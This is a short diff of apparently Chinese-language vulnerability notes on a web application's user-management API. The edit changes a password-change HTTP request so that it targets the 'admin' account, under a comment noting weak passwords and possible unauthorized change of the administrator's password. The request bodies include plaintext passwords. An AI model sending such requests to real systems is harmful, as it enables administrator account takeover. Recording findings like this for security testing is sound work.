@@ -91,7 +91,8 @@ Content-Length: 291
 {"activitiSync":"1","isRemoteSpecialist":"0","username":"1111","password":"Byxe3312@","confirmpassword":"Byxe3312@","realname":"111111111","workNo":"1111111","birthday":"","avatar":null,"selectedroles":"","selecteddeparts":"","userIdentity":"1","departIds":"","orgId":"LIS20170328006643931"}
 ```
 
-改密码，可以若密码
+^
+改密码，可以弱密码，可能越权修改管理员密码
 ```
 PUT /cdxt-boot/sys/user/changePassword HTTP/1.1
 Host: jia
@@ -107,7 +108,7 @@ Referer: http://ji
 Content-Type: application/json;charset=UTF-8
 Content-Length: 97
 
-{"username":"1111","password":"123456","confirmpassword":"123456","orgId":"LIS20170328006643931"}
+{"username":"admin","password":"123456byxe","confirmpassword":"123456byxe","orgId":"LIS20170328006643931"}
 ```
 
 删除用户delete
